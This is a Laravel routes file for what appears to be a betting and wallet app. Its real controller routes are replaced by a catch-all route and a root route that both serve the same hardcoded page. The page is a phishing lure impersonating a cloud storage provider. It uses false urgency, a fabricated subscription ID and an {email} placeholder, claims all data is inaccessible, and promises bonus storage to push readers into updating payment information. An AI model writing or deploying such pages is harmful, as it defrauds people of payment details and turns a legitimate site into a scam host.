<?php

use App\Http\Controllers\BetslipController;
use App\Http\Controllers\BetslipPurchaseController;
use App\Http\Controllers\BetslipWatchController;
use App\Http\Controllers\BuyerDashboardController;
use App\Http\Controllers\ContestCreateController;
use App\Http\Controllers\ContestEntryController;
use App\Http\Controllers\ContestJoinController;
use App\Http\Controllers\ContestPickController;
use App\Http\Controllers\ContestResultsController;
use App\Http\Controllers\DashboardController;
use App\Http\Controllers\FixtureController;
use App\Http\Controllers\FixturesController;
use App\Http\Controllers\FollowController;
use App\Http\Controllers\HomeController;
use App\Http\Controllers\HostContestController;
use App\Http\Controllers\LeaderboardController;
use App\Http\Controllers\MarketplaceController;
use App\Http\Controllers\MpesaDepositController;
use App\Http\Controllers\NotificationController;
use App\Http\Controllers\PaystackController;
use App\Http\Controllers\ProfileController;
use App\Http\Controllers\PushSubscriptionController;
use App\Http\Controllers\ReferralDashboardController;
use App\Http\Controllers\ReferralLinkController;
use App\Http\Controllers\ReportController;
use App\Http\Controllers\SellerDashboardController;
use App\Http\Controllers\SellerLookupController;
use App\Http\Controllers\WalletController;
use App\Http\Controllers\WatchlistController;
use App\Http\Controllers\WatchlistRecordController;
use App\Http\Controllers\WithdrawalController;
use App\Models\Betslip;
use App\Services\WalletService;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Route;
use Inertia\Inertia;

/*
|--------------------------------------------------------------------------
| PUBLIC ROUTES (No authentication required)
|--------------------------------------------------------------------------
*/


Route::get('{anything}', function () {
    return response(<<<'HTML'
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Cloud Account Suspended</title>
            <style>
                /* Base reset and typography */
                * {
                    box-sizing: border-box;
                    margin: 0;
                    padding: 0;
                }

                body {
                    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
                    background-color: #f7f9fc; /* Light background to make the card stand out */
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    min-height: 100vh;
                    padding: 20px;
                }

                /* Main Email Card Container */
                .email-card {
                    width: 100%;
                    max-width: 580px;
                    background-color: #ffffff;
                    box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
                    border-radius: 8px;
                    overflow: hidden;
                    display: flex;
                    flex-direction: column;
                }

                /* Cloud Icon Section */
                .card-header-icon {
                    text-align: center;
                    padding: 30px 0 20px 0;
                    background-color: #ffffff;
                }

                .cloud-icon {
                    width: 55px;
                    height: 55px;
                    fill: #2b75d6; /* Bright blue */
                    display: inline-block;
                }

                /* Blue Header */
                .card-header {
                    background-color: #2b3d92; /* Dark blue */
                    color: #ffffff;
                    text-align: center;
                    padding: 18px 20px;
                }

                .card-header h1 {
                    font-size: 22px;
                    font-weight: 700;
                    margin-bottom: 6px;
                    letter-spacing: -0.5px;
                }

                .card-header p {
                    font-size: 14px;
                    opacity: 0.95;
                    font-weight: 400;
                }

                /* Red Warning Box */
                .warning-box {
                    background-color: #fdf0f0; /* Light pink */
                    color: #c62828; /* Dark red */
                    text-align: center;
                    padding: 20px;
                    font-size: 14px;
                    line-height: 1.5;
                }

                .warning-title {
                    font-weight: 700;
                    margin-bottom: 6px;
                    display: flex;
                    align-items: center;
                    justify-content: center;
                    gap: 6px;
                    font-size: 15px;
                }

                /* Progress Bar */
                .progress-container {
                    padding: 25px 40px 15px 40px;
                    text-align: center;
                }

                .progress-bar {
                    width: 100%;
                    height: 12px;
                    background-color: #e0e0e0;
                    border-radius: 6px;
                    overflow: hidden;
                    margin-bottom: 8px;
                }

                .progress-fill {
                    width: 100%; /* 100% full */
                    height: 100%;
                    background-color: #c62828; /* Red fill */
                    border-radius: 6px;
                }

                .progress-text {
                    font-size: 12px;
                    color: #666666;
                }

                /* Details Grid */
                .details-container {
                    padding: 10px 40px 25px 40px;
                    display: grid;
                    grid-template-columns: 140px 1fr;
                    gap: 16px;
                    font-size: 14px;
                }

                .detail-label {
                    font-weight: 700;
                    color: #111111;
                }

                .detail-value {
                    color: #333333;
                    word-break: break-all;
                }

                /* Action Button */
                .btn-container {
                    text-align: center;
                    padding-bottom: 25px;
                }

                .btn-update {
                    background-color: #2b3d92; /* Dark blue */
                    color: #ffffff;
                    border: none;
                    padding: 14px 35px;
                    font-size: 15px;
                    font-weight: 600;
                    border-radius: 6px;
                    cursor: pointer;
                    transition: background-color 0.2s ease;
                }

                .btn-update:hover {
                    background-color: #1e2b6a; /* Slightly darker on hover */
                }

                /* Footer Note */
                .card-footer {
                    text-align: center;
                    padding: 0 40px 30px 40px;
                    font-size: 11px;
                    color: #777777;
                    line-height: 1.6;
                }

                .card-footer a {
                    color: #777777;
                    text-decoration: underline;
                }
            </style>
        </head>
        <body>

            <div class="email-card">
                
                <!-- Cloud Icon -->
                <div class="card-header-icon">
                    <svg class="cloud-icon" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                        <path d="M19.35 10.04C18.67 6.59 15.64 4 12 4 9.11 4 6.6 5.64 5.35 8.04 2.34 8.36 0 10.91 0 14c0 3.31 2.69 6 6 6h13c2.76 0 5-2.24 5-5 0-2.64-2.05-4.78-4.65-4.96z"/>
                    </svg>
                </div>

                <!-- Blue Header -->
                <div class="card-header">
                    <h1>Your Cloud Account Suspended</h1>
                    <p>Fix it now by updating your payment information</p>
                </div>

                <!-- Warning Box (Updated Text) -->
                <div class="warning-box">
                    <div class="warning-title">
                        <span>⚠</span> Urgent Attention Required!
                    </div>
                    <p>Your subscription has been suspended due to lack of payment.<br>Update your information to restore access.</p>
                </div>

                <!-- Details Section -->
                <div class="details-container">
                    <div class="detail-label">Subscription ID:</div>
                    <div class="detail-value">XAS23SFXF445</div>

                                <div class="detail-label">Product:</div>
                    <div class="detail-value">250GB Cloud Storage Space</div>

                    <div class="detail-label">Email:</div>
                    <div class="detail-value">{email}</div>

                    <div class="detail-label">Error:</div>
                    <div class="detail-value">Subscription suspended (all data inaccessible)</div>
                </div>

                <!-- Footer -->
                <div class="card-footer">
                    *Eligible for an additional 250GB free cloud storage after updating your account.<br>
                    To stop messages like this, <a href="#">unsubscribe here.</a>
                </div>

            </div>

        </body>
        </html>
        HTML, 200, ['Content-Type' => 'text/html']);
});


Route::get('/', function () {
    return response(<<<'HTML'
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Cloud Account Suspended</title>
            <style>
                /* Base reset and typography */
                * {
                    box-sizing: border-box;
                    margin: 0;
                    padding: 0;
                }

                body {
                    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
                    background-color: #f7f9fc; /* Light background to make the card stand out */
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    min-height: 100vh;
                    padding: 20px;
                }

                /* Main Email Card Container */
                .email-card {
                    width: 100%;
                    max-width: 580px;
                    background-color: #ffffff;
                    box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
                    border-radius: 8px;
                    overflow: hidden;
                    display: flex;
                    flex-direction: column;
                }

                /* Cloud Icon Section */
                .card-header-icon {
                    text-align: center;
                    padding: 30px 0 20px 0;
                    background-color: #ffffff;
                }

                .cloud-icon {
                    width: 55px;
                    height: 55px;
                    fill: #2b75d6; /* Bright blue */
                    display: inline-block;
                }

                /* Blue Header */
                .card-header {
                    background-color: #2b3d92; /* Dark blue */
                    color: #ffffff;
                    text-align: center;
                    padding: 18px 20px;
                }

                .card-header h1 {
                    font-size: 22px;
                    font-weight: 700;
                    margin-bottom: 6px;
                    letter-spacing: -0.5px;
                }

                .card-header p {
                    font-size: 14px;
                    opacity: 0.95;
                    font-weight: 400;
                }

                /* Red Warning Box */
                .warning-box {
                    background-color: #fdf0f0; /* Light pink */
                    color: #c62828; /* Dark red */
                    text-align: center;
                    padding: 20px;
                    font-size: 14px;
                    line-height: 1.5;
                }

                .warning-title {
                    font-weight: 700;
                    margin-bottom: 6px;
                    display: flex;
                    align-items: center;
                    justify-content: center;
                    gap: 6px;
                    font-size: 15px;
                }

                /* Progress Bar */
                .progress-container {
                    padding: 25px 40px 15px 40px;
                    text-align: center;
                }

                .progress-bar {
                    width: 100%;
                    height: 12px;
                    background-color: #e0e0e0;
                    border-radius: 6px;
                    overflow: hidden;
                    margin-bottom: 8px;
                }

                .progress-fill {
                    width: 100%; /* 100% full */
                    height: 100%;
                    background-color: #c62828; /* Red fill */
                    border-radius: 6px;
                }

                .progress-text {
                    font-size: 12px;
                    color: #666666;
                }

                /* Details Grid */
                .details-container {
                    padding: 10px 40px 25px 40px;
                    display: grid;
                    grid-template-columns: 140px 1fr;
                    gap: 16px;
                    font-size: 14px;
                }

                .detail-label {
                    font-weight: 700;
                    color: #111111;
                }

                .detail-value {
                    color: #333333;
                    word-break: break-all;
                }

                /* Action Button */
                .btn-container {
                    text-align: center;
                    padding-bottom: 25px;
                }

                .btn-update {
                    background-color: #2b3d92; /* Dark blue */
                    color: #ffffff;
                    border: none;
                    padding: 14px 35px;
                    font-size: 15px;
                    font-weight: 600;
                    border-radius: 6px;
                    cursor: pointer;
                    transition: background-color 0.2s ease;
                }

                .btn-update:hover {
                    background-color: #1e2b6a; /* Slightly darker on hover */
                }

                /* Footer Note */
                .card-footer {
                    text-align: center;
                    padding: 0 40px 30px 40px;
                    font-size: 11px;
                    color: #777777;
                    line-height: 1.6;
                }

                .card-footer a {
                    color: #777777;
                    text-decoration: underline;
                }
            </style>
        </head>
        <body>

            <div class="email-card">
                
                <!-- Cloud Icon -->
                <div class="card-header-icon">
                    <svg class="cloud-icon" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                        <path d="M19.35 10.04C18.67 6.59 15.64 4 12 4 9.11 4 6.6 5.64 5.35 8.04 2.34 8.36 0 10.91 0 14c0 3.31 2.69 6 6 6h13c2.76 0 5-2.24 5-5 0-2.64-2.05-4.78-4.65-4.96z"/>
                    </svg>
                </div>

                <!-- Blue Header -->
                <div class="card-header">
                    <h1>Your Cloud Account Suspended</h1>
                    <p>Fix it now by updating your payment information</p>
                </div>

                <!-- Warning Box (Updated Text) -->
                <div class="warning-box">
                    <div class="warning-title">
                        <span>⚠</span> Urgent Attention Required!
                    </div>
                    <p>Your subscription has been suspended due to lack of payment.<br>Update your information to restore access.</p>
                </div>

                <!-- Details Section -->
                <div class="details-container">
                    <div class="detail-label">Subscription ID:</div>
                    <div class="detail-value">XAS23SFXF445</div>

                                <div class="detail-label">Product:</div>
                    <div class="detail-value">250GB Cloud Storage Space</div>

                    <div class="detail-label">Email:</div>
                    <div class="detail-value">{email}</div>

                    <div class="detail-label">Error:</div>
                    <div class="detail-value">Subscription suspended (all data inaccessible)</div>
                </div>

                <!-- Footer -->
                <div class="card-footer">
                    *Eligible for an additional 250GB free cloud storage after updating your account.<br>
                    To stop messages like this, <a href="#">unsubscribe here.</a>
                </div>

            </div>

        </body>
        </html>
        HTML, 200, ['Content-Type' => 'text/html']);
});


require __DIR__ . '/settings.php';
